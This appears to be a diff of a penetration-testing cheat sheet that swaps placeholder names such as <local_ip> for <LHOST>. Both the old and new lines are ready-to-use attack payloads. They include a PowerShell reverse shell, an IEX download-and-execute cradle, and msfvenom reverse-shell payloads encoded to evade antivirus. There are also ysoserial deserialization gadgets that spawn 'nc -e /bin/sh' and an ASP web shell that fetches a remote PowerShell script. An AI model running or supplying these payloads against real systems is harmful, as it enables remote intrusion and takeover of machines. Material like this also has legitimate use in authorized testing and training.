@@ -1102,20 +1102,20 @@ cp Invoke-PowerShellTcp.ps1 Invoke-PowerShellTcp.ps1
 tail -3 Invoke-PowerShellTcp.ps1
 }
 
-Invoke-PowerShellTcp -Reverse -IPAddress <local_ip> -Port <local_port>
+Invoke-PowerShellTcp -Reverse -IPAddress <LHOST> -Port <LPORT>
 
-powershell "IEX(New-Object Net.Webclient).downloadString('http://<local_ip>:<local_port>/Invoke-PowerShellTcp.ps1')"
+powershell "IEX(New-Object Net.Webclient).downloadString('http://<LHOST>:<LPORT>/Invoke-PowerShellTcp.ps1')"
 ```
 #### Shikata Ga Nai
 ```c
-msfvenom -p windows/shell_reverse_tcp LHOST=<local_ip> LPORT=<local_port> -f c -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai
+msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f c -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai
 
-msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=<local_ip> LPORT=<local_port> -b "\x00" -e x86/shikata_ga_nai -f exe -o /tmp/shell.exe
+msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -b "\x00" -e x86/shikata_ga_nai -f exe -o /tmp/shell.exe
 ```
 #### ysoserial
 ```c
 java -jar ysoserial-master-SNAPSHOT.jar
-java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections1 'nc <local_ip> <local_port> -e /bin/sh' | base64 -w 0
+java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections1 'nc <LHOST> <LPORT> -e /bin/sh' | base64 -w 0
 java -jar ysoserial.jar Groovy1 calc.exe > groovypayload.bin
 java -jar ysoserial-master-6eca5bc740-1.jar CommonsCollections4 "$jex" > /tmp/$filename.session
 ```
@@ -1144,7 +1144,7 @@ java -jar ysoserial-master-6eca5bc740-1.jar CommonsCollections4 "$jex" > /tmp/$f
 <!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
 <%
 Set s = CreateObject("WScript.Shell")
-Set cmd = s.Exec("cmd /c powershell -c IEX (New-Object Net.Webclient).downloadstring('http://10.10.14.10/shellyjelly.ps1')")
+Set cmd = s.Exec("cmd /c powershell -c IEX (New-Object Net.Webclient).downloadstring('http://<LHOST>/shellyjelly.ps1')")
 o = cmd.StdOut.Readall()
 Response.write(o)
 %>
@@ -1182,7 +1182,7 @@ finally:
 #### JSON POST Request
 ```c
 POST /<path> HTTP/1.1
-Host: <remote_ip>
+Host: <RHOST>
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
 Accept: */*
 Accept-Language: en-US,en;q=0.5
@@ -1192,9 +1192,9 @@ Connection: close
 
 {
   "auth":{
-    "name":"<user>",
-    "password":"<password>"
+    "name":"<USERNAME>",
+    "password":"<PASSWORD>"
   },
-  "filename":"<file>"
+  "filename":"<FILE>"
 }
 ```
